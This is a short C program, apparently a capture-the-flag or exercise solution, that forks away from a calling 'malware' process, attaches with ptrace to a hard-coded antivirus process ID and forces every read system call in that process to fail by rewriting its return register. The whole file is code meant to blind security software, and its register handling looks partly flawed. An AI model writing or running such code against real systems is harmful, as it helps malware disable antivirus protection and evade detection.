#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/syscall.h>


struct user_regs_struct regs;
int pid = 0x12345678;
int status;


int main(int argc, char **argv) {
    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }

   // Try to attach to antivirus process 
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)==-1){
        perror("Attach");
        return -1;
    }

    // Waiting for the son process to stop 
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)){   
        perror("waitpit failed");
        return -1;
    }

    while(1) {
        // Catch a system call
        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL)==-1)  { return -1; }

        waitpid(pid, &status, 0);
        if (WIFEXITED(status)){   
            perror("waitpit failed");
            return -1;
        }

        if (ptrace(PTRACE_GETREGS, pid, 0, &regs)==-1)  {  
            perror("PTRACE_GETREGS");
            return -1;  
        }
        
        // if it's read syscall
        if (regs.orig_eax == SYS_read){ 
            regs.eax = -1;   // EAX = -1 (read failed)
            ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        }

        // Run the syscall
        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL)==-1)  { return -1; }

        waitpid(pid, &status, 0);
        if (WIFEXITED(status)){   
            perror("waitpit failed");
            return -1;
        }
    }
    
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("Detach");
        return 1;
    }
    return 0;
}
